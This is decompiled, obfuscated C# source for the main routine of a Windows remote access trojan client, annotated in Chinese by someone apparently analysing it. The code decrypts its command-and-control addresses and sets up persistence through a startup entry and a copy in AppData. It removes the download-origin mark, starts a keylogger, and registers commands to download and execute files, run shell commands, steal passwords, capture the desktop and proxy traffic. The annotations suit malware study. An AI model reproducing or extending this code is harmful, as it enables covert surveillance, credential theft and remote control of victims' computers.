using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Networking;
using xClient.Core.Packets;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.ReverseProxy.Packets;
using xClient.Core.Utilities;

// Token: 0x020000E6 RID: 230
internal static class Class10
{
	// Token: 0x060005B8 RID: 1464
	[STAThread]
	private static void Main(string[] args)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		GClass35.smethod_0(); //解密字符串
		Class10.smethod_2(); //主要功能函数包添加启动项 远程更新 获取上线信息 日志线程启动  
		if (!GClass0.Disconnect)//判断是否连接成功，失败则进入Class10.smethod_3();
		{
			Class10.smethod_3(); //事件监听类，触发事件做出响应
		}
		Class10.smethod_0(); //服务线程退出关闭
	}

	// Token: 0x060005B9 RID: 1465
	private static void smethod_0()
	{
		GClass17.smethod_29();
		if (GClass17.unsafeStreamCodec_0 != null)
		{
			GClass17.unsafeStreamCodec_0.Dispose();
		}
		if (Keylogger.Instance != null)
		{
			Keylogger.Instance.Dispose();
		}
		if (Class10.applicationContext_0 != null)
		{
			Class10.applicationContext_0.ExitThread();
		}
		GClass2.smethod_1();
	}

	// Token: 0x060005BA RID: 1466
	private static void smethod_1()
	{
		Class10.client_0 = new Client();
		Class10.client_0.AddTypesToSerializer(new Type[]
		{
			typeof(GetAuthentication), //得到身份验证
			typeof(DoClientDisconnect), //客户端失去连接包
			typeof(DoClientReconnect), //客户端重新连接包
			typeof(DoClientUninstall), //客户端卸载包
			typeof(DoDownloadAndExecute), //下载并且执行包 隐藏运行 和url
			typeof(DoUploadAndExecute), //上传并且执行包
			typeof(GetDesktop), //获取桌面数据包 包含传输质量 和显示器编号
			typeof(GetProcesses), //得到进程包
			typeof(DoProcessKill), //杀死进程包
			typeof(DoProcessStart), //进程启动包
			typeof(GetDrives), //得到设备包
			typeof(GetDirectory), //得到文件夹
			typeof(DoDownloadFile), //执行下载文件包
			typeof(DoMouseEvent), //移动鼠标事件包
			typeof(DoKeyboardEvent), //按键事件包
			typeof(GetSystemInfo), //得到系统信息包
			typeof(DoVisitWebsite), //访问web站点包
			typeof(DoShowMessageBox), //显示windows弹窗包
			typeof(DoClientUpdate), //执行更新客户端包
			typeof(GetMonitors), //得到显示器包
			typeof(DoShellExecute), //执行shell命令包
			typeof(DoPathRename), //路径重命名包
			typeof(DoPathDelete), //路径删除包
			typeof(DoShutdownAction), //执行关机包
			typeof(GetStartupItems), //得到所有启动项
			typeof(DoStartupItemAdd),  //执行启动项目添加
			typeof(DoStartupItemRemove),//执行启动项目删除
			typeof(DoDownloadFileCancel), //下载文件取消包
			typeof(GetKeyloggerLogs), //得到按键日志包
			typeof(DoUploadFile), //上传文件包
			typeof(GetPasswords), //得到密码包
			typeof(SetAuthenticationSuccess), //设置身份验证成功包
			typeof(GetAuthenticationResponse), //重新设置身份验证包
			typeof(SetStatus), //设置状态包
			typeof(SetStatusFileManager), //设置文件状态
			typeof(SetUserStatus), //设置用户状态
			typeof(GetDesktopResponse), //得到桌面响应
			typeof(GetProcessesResponse), //得到进程响应
			typeof(GetDrivesResponse), //得到设备响应
			typeof(GetDirectoryResponse), //得到文件夹响应
			typeof(DoDownloadFileResponse), //执行下载文件响应
			typeof(GetSystemInfoResponse),//得到系统信息响应
			typeof(GetMonitorsResponse), //得到显示器响应
			typeof(DoShellExecuteResponse), //执行shell命令响应
			typeof(GetStartupItemsResponse), //重新获取
			typeof(GetKeyloggerLogsResponse), //重新获取按键日志响应
			typeof(GetPasswordsResponse), //重新得到密码包
			typeof(ReverseProxyConnect), //反向代理连接包
			typeof(ReverseProxyConnectResponse), //反向代理重新连接
			typeof(ReverseProxyData), //反向代理数据
			typeof(ReverseProxyDisconnect) //反向代理结束
		});
		Class10.client_0.ClientState += Class10.smethod_6;
		Class10.client_0.ClientRead += Class10.smethod_7;
		Class10.client_0.ClientFail += Class10.smethod_8;
	}

	// Token: 0x060005BB RID: 1467
	private static void smethod_2()
	{
		//判断判断互斥体是否多开，有则失去连接，并且返回
		if (!GClass2.smethod_0(GClass35.string_6))
		{
			GClass0.Disconnect = true;
		}
		if (GClass0.Disconnect)
		{
			return;
		}
		//解密Key
		GClass18.smethod_0(GClass35.string_2);
		//将上线地址解密放进队列在给实体类复制 （说明支持多地址上线）
		Class10.gclass25_0 = new GClass25(GClass6.smethod_0(GClass35.string_1));
		//解密远程文件下载路径 %AppData%/Subdir/client.exe
		GClass0.InstallPath = Path.Combine(GClass35.string_3, ((!string.IsNullOrEmpty(GClass35.string_4)) ? (GClass35.string_4 + "\\") : "") + GClass35.string_5);
		//geoip信息获取ip地理位置国家等信息
		GClass34.smethod_0();
		//判断上线地址是否失败
		if (Class10.gclass25_0.IsEmpty)
		{
			GClass0.Disconnect = true;
		}
		if (GClass0.Disconnect)
		{
			return;
		}
		//删除当前目录下的后缀为:Zone.Identifier
		GClass4.smethod_2(GClass0.CurrentPath);
		//判断当前目录是否是下载目录如果不是则进入
		if (GClass35.bool_0 && !(GClass0.CurrentPath == GClass0.InstallPath))
		{
			//互斥体存在则关闭
			GClass2.smethod_1();
			//运行下载路径的文件
			GClass13.smethod_0(Class10.client_0);
			return;
		}
		//用户状态更新线程 五秒更新一次
		GClass3.smethod_2();
		//添加程序到用户启动项
		if (GClass35.bool_1 && GClass35.bool_0 && !GClass16.smethod_1())
		{
			GClass0.AddToStartupFailed = true;
		}
		//添加并初始化实体类
		Class10.smethod_1();
		if (GClass35.bool_3)
		{
			if (Class10.threadStart_0 == null)
			{
				Class10.threadStart_0 = new ThreadStart(Class10.smethod_9);
			}
			new Thread(Class10.threadStart_0).Start();
			return;
		}
	}

	// Token: 0x060005BC RID: 1468
	private static void smethod_3()
	{
		while (Class10.bool_0 && !GClass0.Disconnect)
		{
			if (!Class10.bool_1)//判定连接状态未连接就等待一下重新连接
			{
				Thread.Sleep(100 + new Random().Next(0, 250));//延迟心跳包时间100+随机0-250
				GClass24 gclass = Class10.gclass25_0.method_0();//取出上线地址列表
				Class10.client_0.Connect(gclass.Hostname, gclass.Port);//连接上线地址主机与端口
				Thread.Sleep(200); //延迟200毫秒
				Application.DoEvents(); //执行事件
			}
			while (Class10.bool_1)//已连接就直接执行事件
			{
				Application.DoEvents();////执行事件
				Thread.Sleep(2500);
			}
			if (GClass0.Disconnect)//失去连接
			{
				Class10.client_0.Disconnect(); //连接断开
				return; //结束线程
			}
			Thread.Sleep(GClass35.int_0 + new Random().Next(250, 750)); //延迟3000 + 250-750随机毫秒
		}
	}

	// Token: 0x060005BD RID: 1469
	public static void smethod_4(bool reconnect = false)
	{
		if (reconnect)
		{
			GClass17.smethod_29();
		}
		else
		{
			GClass0.Disconnect = true;
		}
		Class10.client_0.Disconnect();
	}

	// Token: 0x060005BE RID: 1470
	private static void smethod_5()
	{
		GClass17.smethod_29();
	}

	// Token: 0x060005BF RID: 1471
	private static void smethod_6(Client client, bool connected)
	{
		GClass0.IsAuthenticated = false;
		if (connected && !GClass0.Disconnect)
		{
			Class10.bool_0 = true;
		}
		else if (!connected && GClass0.Disconnect)
		{
			Class10.bool_0 = false;
		}
		else
		{
			Class10.bool_0 = !GClass0.Disconnect;
		}
		if (Class10.bool_1 != connected && !connected && Class10.bool_0 && !GClass0.Disconnect)
		{
			Class10.smethod_5();
		}
		Class10.bool_1 = connected;
	}

	// Token: 0x060005C0 RID: 1472
	private static void smethod_7(Client client, IPacket packet)
	{
		PacketHandler.HandlePacket(client, packet);
	}

	// Token: 0x060005C1 RID: 1473
	private static void smethod_8(Client client, Exception ex)
	{
		client.Disconnect();
	}

	// Token: 0x060005C2 RID: 1474
	[CompilerGenerated]
	private static void smethod_9()
	{
		Class10.applicationContext_0 = new ApplicationContext();
		new Keylogger(15000.0);
		Application.Run(Class10.applicationContext_0);
	}

	// Token: 0x040002BE RID: 702
	public static Client client_0;

	// Token: 0x040002BF RID: 703
	private static bool bool_0 = true;

	// Token: 0x040002C0 RID: 704
	private static volatile bool bool_1 = false;

	// Token: 0x040002C1 RID: 705
	private static ApplicationContext applicationContext_0;

	// Token: 0x040002C2 RID: 706
	private static GClass25 gclass25_0;

	// Token: 0x040002C3 RID: 707
	[CompilerGenerated]
	private static ThreadStart threadStart_0;
}
